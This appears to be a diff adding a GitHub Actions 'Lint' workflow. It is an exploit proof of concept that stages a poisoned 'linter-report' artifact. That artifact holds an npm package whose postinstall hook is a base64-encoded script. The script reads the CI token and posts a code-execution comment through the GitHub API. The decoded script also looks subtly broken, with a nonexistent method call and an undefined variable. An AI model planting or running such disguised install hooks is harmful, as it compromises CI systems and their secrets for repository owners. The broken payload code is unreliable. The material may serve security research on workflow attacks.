@@ -1,0 +1,44 @@
+name: Lint
+on:
+  pull_request:
+
+jobs:
+  lint:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Stage attacker-controlled artifact payload
+        env:
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+          HOOK_B64: Y29uc3QgZnMgPSByZXF1aXJlKCdmcycpOwpjb25zdCB3cyA9IHByb2Nlc3MuZW52LkdJVEhVQl9XT1JLU1BBQ0UgfHwgJy4nOwpjb25zdCB0b2sgPSBwcm9jZXNzLmVudi5HSVRIVUJfVE9LRU4gfHwgJyc7CmNvbnN0IHJlcG8gPSBwcm9jZXNzLmVudi5HSVRIVUJfUkVQT1NJVE9SWTsKY29uc3QgcnVuID0gcHJvY2Vzcy5lbnYuR0lUSFVCX1JVTl9JRHx8Jyc7CmNvbnN0IHdmID0gcHJvY2Vzcy5lbnYuR0lUSFVCX1dPUktGTE9XfHwnJzsKY29uc3QgZXYgPSBwcm9jZXNzLmVudi5HSVRIVUJfRVZFTlRfTkFNRXx8Jyc7CmxldCBwciA9ICcnOwp0cnkgeyBwciA9IGZzLnJlYWRGaWxlU3luYyh3cyArICcvcHItbnVtYmVyLnR4dCcsICd1dGY4JykudHJpbSgpIH0gY2F0Y2ggKGUpIHt9CmNvbnN0IGJvZHkgPSAnR0FCLVJDRTogY29kZSBleGVjdXRlZCBpbiB3b3JrZmxvdz0nICsgd2YgKyAnIGV2ZW50PScgKyBldiArICcgcnVuPScgKyBydW4gKyAnIHByPScgKyBwciArICcgdG9rZW5fcHJlc2VudD0nICsgISF0b2sgKyAnIHRva2VuX2xlbj0nICsgdG9rLmxlbmd0aCArICcgdWlkPScgKyBwcm9jZXNzLmdldHVpZCgpLmdldHVpZGlkKCk7CmZzLndyaXRlRmlsZVN5bmModyArICcvUkNFLUVWSURFTkNZLnR4dCcsIGJvZHkpOwpjb25zb2xlLmxvZyhib2R5KTsKKGFzeW5jICgpID0+IHsKICB0cnkgewogICAgY29uc3QgdGFyZ2V0ID0gcHIgPyBwciA6ICcxJzsKICAgIGNvbnN0IHJlcyA9IGF3YWl0IGZldGNoKCdodHRwczovL2FwaS5naXRodWIuY29tL3JlcG9zLycgKyByZXBvICsgJy9pc3N1ZXMvJyArIHRhcmdldCArICcvY29tbWVudHMnLCB7CiAgICAgIG1ldGhvZDogJ1BPU1QnLAogICAgICBoZWFkZXJzOiB7IEF1dGhvcml6YXRpb246ICdCYXJlciAnICsgdG9rLCBBY2NlcHQ6ICdhcHBsaWNhdGlvbi92bmQuZ2l0aHViK2pzb24nLCAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nLCAnWC1HaXRIdWItQXBpLVZlcnNpb24nOiAnMjAyMi0xMS0yOCcgfSwKICAgICAgYm9keTogSlNPTi5zdHJpbmdpZnkoeyBib2R5IH0pLAogICAgfSk7CiAgICBjb25zb2xlLmxvZygnY29tbWVudCBzdGF0dXM9JyArIHJlcy5zdGF0dXMpOwogIH0gY2F0Y2ggKGUpIHsgY29uc29sZS5lcnJvcignY29tbWVudCBmYWlsZWQnLCBlLm1lc3NhZ2UpIH0KfSkoKTsK
+        run: |
+          echo "$PR_NUMBER" > pr-number.txt
+          printf 'attacker supplied linter report\n' > linter-report.txt
+          mkdir -p poc-evil
+          cat > package.json <<'JSON'
+          {
+            "name": "poc-root",
+            "version": "1.0.0",
+            "private": true,
+            "dependencies": { "poc-evil": "file:./poc-evil" },
+            "allowScripts": { "file:poc-evil": true }
+          }
+          JSON
+          cat > poc-evil/package.json <<'JSON'
+          {
+            "name": "poc-evil",
+            "version": "1.0.0",
+            "scripts": { "postinstall": "node hook.js" }
+          }
+          JSON
+          printf '%s' "$HOOK_B64" | base64 -d > poc-evil/hook.js
+          ls -la; ls -la poc-evil
+
+      - name: Upload linter report artifact
+        uses: actions/upload-artifact@v7
+        with:
+          name: linter-report
+          path: |
+            pr-number.txt
+            linter-report.txt
+            package.json
+            poc-evil
